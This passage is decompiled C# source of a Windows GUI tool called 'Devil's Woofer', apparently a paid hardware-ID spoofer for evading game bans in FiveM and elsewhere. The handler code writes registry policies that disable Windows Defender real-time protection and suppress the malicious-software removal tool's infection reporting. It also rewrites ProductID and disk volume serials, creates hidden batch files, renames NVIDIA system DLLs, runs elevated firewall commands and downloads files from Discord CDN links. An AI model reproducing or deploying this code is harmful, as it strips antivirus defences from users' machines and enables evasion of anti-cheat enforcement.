			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text2 = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text2))
				{
					streamWriter2.WriteLine("netsh int ip reset");
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text2;
				this.d.Add(process2);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process2.Start();
			}
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.FiveM();
			Main.bi();
			Thread.Sleep(2000);
			string path2 = "C:\\Program Files\\Sounds";
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			if (File.Exists("C:\\Program Files\\Sounds\\fivemspoofed.wav"))
			{
				new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
			}
			else
			{
				string address = "https://cdn.discordapp.com/attachments/953684464104513571/959156445411180574/fivemspoofed.wav";
				string fileName = "C:\\Program Files\\Sounds\\fivemspoofed.wav";
				WebClient webClient = new WebClient();
				webClient.DownloadFile(address, fileName);
				File.SetAttributes("C:\\Program Files\\Sounds\\fivemspoofed.wav", FileAttributes.Hidden);
				new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
			}
			MessageBox.Show("Spoofed FiveM, Use new rockstar,steam,discord and restart your pc!", "Devils Woofer - Fast CFX v2", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			File.Delete("C:\\Program Files\\Sounds\\fivemspoofed.wav");
		}

		// Token: 0x0600008D RID: 141 RVA: 0x000092E8 File Offset: 0x000074E8
		public static void ClickUnban()
		{
			List<Process> list = new List<Process>();
			d d = new d();
			d.b();
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine("netsh int ip reset");
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				list.Add(process);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process.Start();
			}
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.FiveM();
			Main.bi();
		}

		// Token: 0x0600008E RID: 142 RVA: 0x000093C0 File Offset: 0x000075C0
		public static string GenID(int length)
		{
			string element = "123457869";
			return new string(Enumerable.Repeat<string>(element, length).Select(new Func<string, char>(Main.<>c.<>9.b)).ToArray<char>());
		}

		// Token: 0x0600008F RID: 143 RVA: 0x0000940C File Offset: 0x0000760C
		public static string DiskGen(int length)
		{
			string element = "12345786789";
			return new string(Enumerable.Repeat<string>(element, length).Select(new Func<string, char>(Main.<>c.<>9.c)).ToArray<char>());
		}

		// Token: 0x06000090 RID: 144 RVA: 0x000022CC File Offset: 0x000004CC
		private void bl(object sender, EventArgs e)
		{
			this.ay.BringToFront();
		}

		// Token: 0x06000091 RID: 145 RVA: 0x000021CF File Offset: 0x000003CF
		private void bm(object sender, EventArgs e)
		{
		}

		// Token: 0x06000092 RID: 146 RVA: 0x00009458 File Offset: 0x00007658
		private void bn(object sender, EventArgs e)
		{
			d d = new d();
			d.b();
			Main.HWIDclick();
			string value = string.Concat(new string[]
			{
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5)
			});
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("ProductID", value);
			registryKey.Close();
			Main.InstallDate();
			Main.Disk();
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.bi();
			Main.SpoofPCName();
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine("netsh int ip reset");
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				this.d.Add(process);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process.Start();
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
			}
			string text2 = this.bh.Text;
			string path2 = "C:\\Program Files\\Unlisted";
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				string text3 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text2,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.d.Add(process2);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process2.Start();
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path2);
			}
			else
			{
				string text4 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter3 = File.CreateText(text4))
				{
					streamWriter3.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text2,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process3 = new Process();
				process3.StartInfo.FileName = text4;
				this.d.Add(process3);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process3.Start();
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path2);
			}
			MessageBox.Show("Spoofed All System", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000093 RID: 147 RVA: 0x000097B4 File Offset: 0x000079B4
		private void bo(object sender, EventArgs e)
		{
			d d = new d();
			d.b();
			if (File.Exists("C:\\Windows\\System32\\nvml.dll"))
			{
				try
				{
					File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
					File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
				}
				catch
				{
				}
			}
			MessageBox.Show("Cleaned Nvidia Logger!", "Devils Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000094 RID: 148 RVA: 0x00002336 File Offset: 0x00000536
		private void bp(object sender, EventArgs e)
		{
			Main.FiveM();
			Main.ClickUnban();
			MessageBox.Show("Spoofed G-Life Identifiers, Flash your bios and use vpn!", "Devils Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000095 RID: 149 RVA: 0x000021CF File Offset: 0x000003CF
		private void bq(object sender, EventArgs e)
		{
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00009820 File Offset: 0x00007A20
		private void br(object sender, EventArgs e)
		{
			string path = "C:\\Program Files\\Pictures";
			try
			{
				string text = "https://cdn.discordapp.com/attachments/954439038109102182/968512955140431912/lean_animated_logo.gif";
				string text2 = "C:\\Program Files\\Pictures\\leanlogo.gif";
				if (!Directory.Exists(path))
				{
					Directory.CreateDirectory(path);
				}
				if (File.Exists(text2))
				{
					this.s.Image = new Bitmap(text2);
				}
				else
				{
					WebClient webClient = new WebClient();
					webClient.DownloadFile(text, text2);
					this.s.Image = new Bitmap(text);
				}
				string path2 = "C:\\Program Files\\Pictures\\imgsave.gif";
				File.Delete(path2);
				Thread.Sleep(50);
				this.s.Image = new Bitmap(text2);
				Thread.Sleep(2000);
				DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Program Files\\Saved");
				foreach (FileInfo fileInfo in directoryInfo.GetFiles())
				{
					fileInfo.Delete();
				}
				foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
				{
					directoryInfo2.Delete(true);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x000021CF File Offset: 0x000003CF
		private void bs(object sender, EventArgs e)
		{
		}

		// Token: 0x06000098 RID: 152 RVA: 0x000021CF File Offset: 0x000003CF
		private void bt(object sender, EventArgs e)
		{
		}

		// Token: 0x06000099 RID: 153 RVA: 0x000021CF File Offset: 0x000003CF
		private void bu(object sender, EventArgs e)
		{
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00009934 File Offset: 0x00007B34
		private void bv(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				File.Move("C:\\Windows\\System32\\nvml2.dll", "C:\\Windows\\System32\\nvml.dll");
				File.Move("C:\\Windows\\System32\\nvmld2.dll", "C:\\Windows\\System32\\nvmld.dll");
			}
		}

		// Token: 0x0600009B RID: 155 RVA: 0x0000996C File Offset: 0x00007B6C
		private void bw(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul"
				}
			}.Start();
			MessageBox.Show("Fixed FiveM Bypass Error", "Devils Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x0600009C RID: 156 RVA: 0x00002355 File Offset: 0x00000555
		private void bx(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/unban");
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00009A28 File Offset: 0x00007C28
		private void by()
		{
			this.e = new Container();
			Animation animation = new Animation();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Main));
			this.f = new SiticoneDragControl(this.e);
			this.g = new SiticoneControlBox();
			this.h = new SiticoneControlBox();
			this.i = new SiticoneTransition();
			this.j = new Label();
			this.k = new Label();
			this.n = new SiticoneLabel();
			this.m = new SiticoneLabel();
			this.p = new SiticoneLabel();
			this.r = new Panel();
			this.s = new PictureBox();
			this.u = new SiticoneShadowPanel();
			this.bk = new SiticoneRoundedButton();
			this.bf = new SiticoneRoundedButton();
			this.ab = new SiticoneRoundedButton();
			this.ac = new SiticoneRoundedButton();
			this.ad = new SiticoneRoundedButton();
			this.ae = new SiticoneRoundedButton();
			this.af = new SiticoneRoundedButton();
			this.ag = new SiticoneRoundedButton();
			this.ah = new SiticoneRoundedButton();
			this.v = new SiticoneLabel();
			this.w = new PictureBox();
			this.x = new Label();
			this.t = new SiticoneLabel();
			this.ai = new SiticoneShadowPanel();
			this.bq = new SiticoneLabel();
			this.br = new SiticoneTextBox();
			this.an = new SiticoneLabel();
			this.am = new SiticoneRoundedButton();
			this.aj = new SiticoneLabel();
			this.ak = new PictureBox();
			this.al = new Label();
			this.ao = new SiticoneComboBox();
			this.ap = new SiticoneShadowPanel();
			this.bo = new SiticoneLabel();
			this.bn = new SiticoneLabel();
			this.bg = new SiticoneLabel();
			this.bh = new SiticoneTextBox();
			this.bd = new SiticoneButton();
			this.aq = new SiticoneLabel();
			this.ar = new PictureBox();
			this.@as = new Label();
			this.at = new Label();
			this.aw = new Label();
			this.ax = new SiticoneLabel();
			this.ay = new SiticoneShadowPanel();
			this.bm = new SiticoneRoundedButton();
			this.bl = new SiticoneRoundedButton();
			this.bj = new SiticoneLabel();
			this.be = new SiticoneRoundedButton();
			this.bv = new SiticoneRoundedButton();
			this.bc = new SiticoneRoundedButton();
			this.az = new SiticoneLabel();
			this.ba = new PictureBox();
			this.bb = new Label();
			this.bp = new SiticoneLabel();
			this.bi = new SiticoneGradientButton();
			this.y = new SiticoneGradientButton();
			this.z = new SiticoneGradientButton();
			this.aa = new SiticoneGradientButton();
			this.bu = new SiticoneLabel();
			this.l = new SiticoneShadowForm(this.e);
			this.o = new System.Windows.Forms.Timer(this.e);
			this.au = new PageSetupDialog();
			this.av = new System.Windows.Forms.Timer(this.e);
			this.bs = new System.Windows.Forms.Timer(this.e);
			this.q = new BindingSource(this.e);
			this.r.SuspendLayout();
			((ISupportInitialize)this.s).BeginInit();
			this.u.SuspendLayout();
			((ISupportInitialize)this.w).BeginInit();
			this.ai.SuspendLayout();
			((ISupportInitialize)this.ak).BeginInit();
			this.ap.SuspendLayout();
			((ISupportInitialize)this.ar).BeginInit();
			this.ay.SuspendLayout();
			((ISupportInitialize)this.ba).BeginInit();
			((ISupportInitialize)this.q).BeginInit();
			base.SuspendLayout();
			this.f.TargetControl = this;
			this.g.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
			this.g.BorderRadius = 10;
			this.i.SetDecoration(this.g, 0);
			this.g.FillColor = Color.Black;
			this.g.HoveredState.FillColor = Color.FromArgb(232, 17, 35);
			this.g.HoveredState.IconColor = Color.White;
			this.g.HoveredState.Parent = this.g;
			this.g.IconColor = Color.White;
			this.g.Location = new Point(613, 4);
			this.g.Name = "siticoneControlBox1";
			this.g.ShadowDecoration.Parent = this.g;
			this.g.Size = new Size(45, 29);
			this.g.TabIndex = 1;
			this.g.Click += this.a;
			this.h.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
			this.h.BorderRadius = 10;
			this.h.ControlBoxType = 0;
			this.i.SetDecoration(this.h, 0);
			this.h.FillColor = Color.Black;
			this.h.HoveredState.Parent = this.h;
			this.h.IconColor = Color.White;
			this.h.Location = new Point(568, 4);
			this.h.Name = "siticoneControlBox2";
			this.h.ShadowDecoration.Parent = this.h;
			this.h.Size = new Size(45, 29);
			this.h.TabIndex = 2;
			this.i.AnimationType = 1;
			this.i.Cursor = null;
			animation.AnimateOnlyDifferences = true;
			animation.BlindCoeff = (PointF)componentResourceManager.GetObject("animation1.BlindCoeff");
			animation.LeafCoeff = 0f;
			animation.MaxTime = 1f;
			animation.MinTime = 0f;
			animation.MosaicCoeff = (PointF)componentResourceManager.GetObject("animation1.MosaicCoeff");
			animation.MosaicShift = (PointF)componentResourceManager.GetObject("animation1.MosaicShift");
			animation.MosaicSize = 0;
			animation.Padding = new Padding(50);
			animation.RotateCoeff = 1f;
			animation.RotateLimit = 0f;
			animation.ScaleCoeff = (PointF)componentResourceManager.GetObject("animation1.ScaleCoeff");
			animation.SlideCoeff = (PointF)componentResourceManager.GetObject("animation1.SlideCoeff");
			animation.TimeCoeff = 0f;
			animation.TransparencyCoeff = 1f;
			this.i.DefaultAnimation = animation;
			this.j.AutoSize = true;
			this.i.SetDecoration(this.j, 0);
			this.j.Font = new Font("Segoe UI Light", 10f);
			this.j.ForeColor = Color.White;
			this.j.Location = new Point(-1, 136);
			this.j.Name = "label1";
			this.j.Size = new Size(0, 19);
			this.j.TabIndex = 22;
			this.k.AutoSize = true;
			this.i.SetDecoration(this.k, 0);
			this.k.Font = new Font("Segoe UI Semibold", 10.2f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.k.ForeColor = Color.White;
			this.k.Location = new Point(14, 7);
			this.k.Margin = new Padding(2, 0, 2, 0);
			this.k.Name = "label2";
			this.k.Size = new Size(101, 19);
			this.k.TabIndex = 27;
			this.k.Text = "Devil's Woofer";
			this.n.BackColor = Color.Transparent;
			this.i.SetDecoration(this.n, 0);
			this.n.Font = new Font("Segoe UI", 12f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, 161);
			this.n.ForeColor = Color.White;
			this.n.Location = new Point(51, 5);
			this.n.Margin = new Padding(2);
			this.n.Name = "usernameLabel";
			this.n.Size = new Size(115, 23);
			this.n.TabIndex = 37;
			this.n.Text = "usernameLabel";
			this.n.Click += this.e;
			this.m.BackColor = Color.Transparent;
			this.i.SetDecoration(this.m, 0);
			this.m.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m.ForeColor = Color.Red;
			this.m.Location = new Point(51, 30);
			this.m.Margin = new Padding(2);
			this.m.Name = "subscription";
			this.m.Size = new Size(95, 15);
			this.m.TabIndex = 39;
			this.m.Text = "subscriptionLabel";
			this.m.Click += this.h;
			this.p.BackColor = Color.Transparent;
			this.i.SetDecoration(this.p, 0);
			this.p.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.p.ForeColor = Color.White;
			this.p.Location = new Point(159, 295);
			this.p.Margin = new Padding(2);
			this.p.Name = "version";
			this.p.Size = new Size(63, 15);
			this.p.TabIndex = 51;
			this.p.Text = "Version: 1.0";
			this.p.Click += this.u;
			this.r.BackColor = Color.Black;
			this.r.Controls.Add(this.m);
			this.r.Controls.Add(this.n);
			this.r.Controls.Add(this.s);
			this.i.SetDecoration(this.r, 0);
			this.r.Location = new Point(11, 34);
			this.r.Name = "panel2";
			this.r.Size = new Size(175, 53);
			this.r.TabIndex = 59;
			this.r.Paint += this.t;
			this.i.SetDecoration(this.s, 0);
			this.s.Image = Resources.images_1;
			this.s.Location = new Point(3, 3);
			this.s.Name = "pictureBox1";
			this.s.Size = new Size(43, 45);
			this.s.SizeMode = PictureBoxSizeMode.Zoom;
			this.s.TabIndex = 10;
			this.s.TabStop = false;
			this.s.Click += this.bq;
			this.u.BackColor = Color.Transparent;
			this.u.Controls.Add(this.bk);
			this.u.Controls.Add(this.bf);
			this.u.Controls.Add(this.ab);
			this.u.Controls.Add(this.ac);
			this.u.Controls.Add(this.ad);
			this.u.Controls.Add(this.ae);
			this.u.Controls.Add(this.af);
			this.u.Controls.Add(this.ag);
			this.u.Controls.Add(this.ah);
			this.u.Controls.Add(this.v);
			this.u.Controls.Add(this.w);
			this.u.Controls.Add(this.x);
			this.i.SetDecoration(this.u, 0);
			this.u.FillColor = Color.Black;
			this.u.Location = new Point(195, 34);
			this.u.Name = "spooferpanel";
			this.u.ShadowColor = Color.Black;
			this.u.Size = new Size(455, 311);
			this.u.TabIndex = 66;
			this.u.Paint += this.r;
			this.bk.BorderColor = Color.DarkRed;
			this.bk.BorderThickness = 1;
			this.bk.CheckedState.Parent = this.bk;
			this.bk.CustomImages.Parent = this.bk;
			this.i.SetDecoration(this.bk, 0);
			this.bk.FillColor = Color.Black;
			this.bk.Font = new Font("Segoe UI", 9f);
			this.bk.ForeColor = Color.Red;
			this.bk.HoveredState.Parent = this.bk;
			this.bk.Location = new Point(54, 260);
			this.bk.Name = "siticoneRoundedButton7";
			this.bk.ShadowDecoration.Parent = this.bk;
			this.bk.Size = new Size(346, 29);
			this.bk.TabIndex = 72;
			this.bk.Text = "Spoof All";
			this.bk.Click += this.bn;
			this.bf.BorderColor = Color.DarkRed;
			this.bf.BorderThickness = 1;
			this.bf.CheckedState.Parent = this.bf;
			this.bf.CustomImages.Parent = this.bf;
			this.i.SetDecoration(this.bf, 0);
			this.bf.FillColor = Color.Black;
			this.bf.Font = new Font("Segoe UI", 9f);
			this.bf.ForeColor = Color.Red;
			this.bf.HoveredState.Parent = this.bf;
			this.bf.Location = new Point(277, 210);
			this.bf.Name = "siticoneRoundedButton10";
			this.bf.ShadowDecoration.Parent = this.bf;
			this.bf.Size = new Size(123, 29);
			this.bf.TabIndex = 71;
			this.bf.Text = "Spoof Logs";
			this.bf.Click += this.at;
			this.ab.BorderColor = Color.DarkRed;
			this.ab.BorderThickness = 1;
			this.ab.CheckedState.Parent = this.ab;
			this.ab.CustomImages.Parent = this.ab;
			this.i.SetDecoration(this.ab, 0);
			this.ab.FillColor = Color.Black;
			this.ab.Font = new Font("Segoe UI", 9f);
			this.ab.ForeColor = Color.Red;
			this.ab.HoveredState.Parent = this.ab;
			this.ab.Location = new Point(54, 124);
			this.ab.Name = "siticoneRoundedButton8";
			this.ab.ShadowDecoration.Parent = this.ab;
			this.ab.Size = new Size(123, 29);
			this.ab.TabIndex = 70;
			this.ab.Text = "Spoof Xbox";
			this.ab.Click += this.al;
			this.ac.BorderColor = Color.DarkRed;
			this.ac.BorderThickness = 1;
			this.ac.CheckedState.Parent = this.ac;
			this.ac.CustomImages.Parent = this.ac;
			this.i.SetDecoration(this.ac, 0);
			this.ac.FillColor = Color.Black;
			this.ac.Font = new Font("Segoe UI", 9f);
			this.ac.ForeColor = Color.Red;
			this.ac.HoveredState.Parent = this.ac;
			this.ac.Location = new Point(277, 169);
			this.ac.Name = "siticoneRoundedButton6";
			this.ac.ShadowDecoration.Parent = this.ac;
			this.ac.Size = new Size(123, 29);
			this.ac.TabIndex = 68;
			this.ac.Text = "Spoof PCname";
			this.ac.Click += this.am;
			this.ad.BorderColor = Color.DarkRed;
			this.ad.BorderThickness = 1;
			this.ad.CheckedState.Parent = this.ad;
			this.ad.CustomImages.Parent = this.ad;
			this.i.SetDecoration(this.ad, 0);
			this.ad.FillColor = Color.Black;
			this.ad.Font = new Font("Segoe UI", 9f);
			this.ad.ForeColor = Color.Red;
			this.ad.HoveredState.Parent = this.ad;
			this.ad.Location = new Point(277, 124);
			this.ad.Name = "siticoneRoundedButton5";
			this.ad.ShadowDecoration.Parent = this.ad;
			this.ad.Size = new Size(123, 29);
			this.ad.TabIndex = 67;
			this.ad.Text = "Spoof ID";
			this.ad.Click += this.ao;
			this.ae.BorderColor = Color.DarkRed;
			this.ae.BorderThickness = 1;
			this.ae.CheckedState.Parent = this.ae;
			this.ae.CustomImages.Parent = this.ae;
			this.i.SetDecoration(this.ae, 0);
			this.ae.FillColor = Color.Black;
			this.ae.Font = new Font("Segoe UI", 9f);
			this.ae.ForeColor = Color.Red;
			this.ae.HoveredState.Parent = this.ae;
			this.ae.Location = new Point(54, 169);
			this.ae.Name = "siticoneRoundedButton4";
			this.ae.ShadowDecoration.Parent = this.ae;
			this.ae.Size = new Size(123, 29);
			this.ae.TabIndex = 66;
			this.ae.Text = "Spoof MAC";
			this.ae.Click += this.ai;
			this.af.BorderColor = Color.DarkRed;
			this.af.BorderThickness = 1;
			this.af.CheckedState.Parent = this.af;
			this.af.CustomImages.Parent = this.af;
			this.i.SetDecoration(this.af, 0);
			this.af.FillColor = Color.Black;
			this.af.Font = new Font("Segoe UI", 9f);
			this.af.ForeColor = Color.Red;
			this.af.HoveredState.Parent = this.af;
			this.af.Location = new Point(54, 210);
			this.af.Name = "siticoneRoundedButton3";
			this.af.ShadowDecoration.Parent = this.af;
			this.af.Size = new Size(123, 29);
			this.af.TabIndex = 65;
			this.af.Text = "Spoof Disk";
			this.af.Click += this.ak;
			this.ag.BorderColor = Color.DarkRed;
			this.ag.BorderThickness = 1;
			this.ag.CheckedState.Parent = this.ag;
			this.ag.CustomImages.Parent = this.ag;
			this.i.SetDecoration(this.ag, 0);
			this.ag.FillColor = Color.Black;
			this.ag.Font = new Font("Segoe UI", 9f);
			this.ag.ForeColor = Color.Red;
			this.ag.HoveredState.Parent = this.ag;
			this.ag.Location = new Point(277, 82);
			this.ag.Name = "siticoneRoundedButton2";
			this.ag.ShadowDecoration.Parent = this.ag;
			this.ag.Size = new Size(123, 29);
			this.ag.TabIndex = 64;
			this.ag.Text = "Spoof Info";
			this.ag.Click += this.aj;
			this.ah.BorderColor = Color.DarkRed;
			this.ah.BorderThickness = 1;
			this.ah.CheckedState.Parent = this.ah;
			this.ah.CustomImages.Parent = this.ah;
			this.i.SetDecoration(this.ah, 0);
			this.ah.FillColor = Color.Black;
			this.ah.Font = new Font("Segoe UI", 9f);
			this.ah.ForeColor = Color.Red;
			this.ah.HoveredState.Parent = this.ah;
			this.ah.Location = new Point(54, 82);
			this.ah.Name = "siticoneRoundedButton1";
			this.ah.ShadowDecoration.Parent = this.ah;
			this.ah.Size = new Size(123, 29);
			this.ah.TabIndex = 63;
			this.ah.Text = "Spoof HWID";
			this.ah.Click += this.ag;
			this.v.BackColor = Color.Transparent;
			this.i.SetDecoration(this.v, 0);
			this.v.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.v.ForeColor = Color.Red;
			this.v.Location = new Point(68, 34);
			this.v.Margin = new Padding(2);
			this.v.Name = "siticoneLabel4";
			this.v.Size = new Size(133, 15);
			this.v.TabIndex = 62;
			this.v.Text = "Clean your system serials";
			this.i.SetDecoration(this.w, 0);
			this.w.Image = Resources.pngaaa_com_3790696;
			this.w.Location = new Point(11, 10);
			this.w.Name = "pictureBox4";
			this.w.Size = new Size(46, 35);
			this.w.SizeMode = PictureBoxSizeMode.Zoom;
			this.w.TabIndex = 25;
			this.w.TabStop = false;
			this.x.AutoSize = true;
			this.i.SetDecoration(this.x, 0);
			this.x.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
			this.x.ForeColor = Color.White;
			this.x.Location = new Point(60, 6);
			this.x.Name = "label5";
			this.x.Size = new Size(107, 32);
			this.x.TabIndex = 9;
			this.x.Text = "Spoofer";
			this.t.BackColor = Color.Transparent;
			this.i.SetDecoration(this.t, 0);
			this.t.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.t.ForeColor = Color.Red;
			this.t.Location = new Point(63, 34);
			this.t.Margin = new Padding(2);
			this.t.Name = "siticoneLabel2";
			this.t.Size = new Size(116, 15);
			this.t.TabIndex = 61;
			this.t.Text = "Coded by Dimis#1821";
			this.ai.BackColor = Color.Black;
			this.ai.Controls.Add(this.bq);
			this.ai.Controls.Add(this.br);
			this.ai.Controls.Add(this.an);
			this.ai.Controls.Add(this.am);
			this.ai.Controls.Add(this.aj);
			this.ai.Controls.Add(this.ak);
			this.ai.Controls.Add(this.al);
			this.ai.Controls.Add(this.ao);
			this.i.SetDecoration(this.ai, 0);
			this.ai.FillColor = Color.Black;
			this.ai.Location = new Point(195, 34);
			this.ai.Name = "gamepanel";
			this.ai.ShadowColor = Color.Black;
			this.ai.Size = new Size(455, 311);
			this.ai.TabIndex = 71;
			this.ai.Paint += this.ae;
			this.bq.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bq, 0);
			this.bq.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bq.ForeColor = Color.Red;
			this.bq.Location = new Point(155, 181);
			this.bq.Margin = new Padding(2);
			this.bq.Name = "textip";
			this.bq.Size = new Size(51, 15);
			this.bq.TabIndex = 74;
			this.bq.Text = "Server IP:";
			this.br.BorderColor = Color.WhiteSmoke;
			this.br.BorderRadius = 3;
			this.br.Cursor = Cursors.IBeam;
			this.i.SetDecoration(this.br, 0);
			this.br.DefaultText = "127.0.0.1:30120";
			this.br.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
			this.br.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
			this.br.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
			this.br.DisabledState.Parent = this.br;
			this.br.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
			this.br.FillColor = Color.Black;
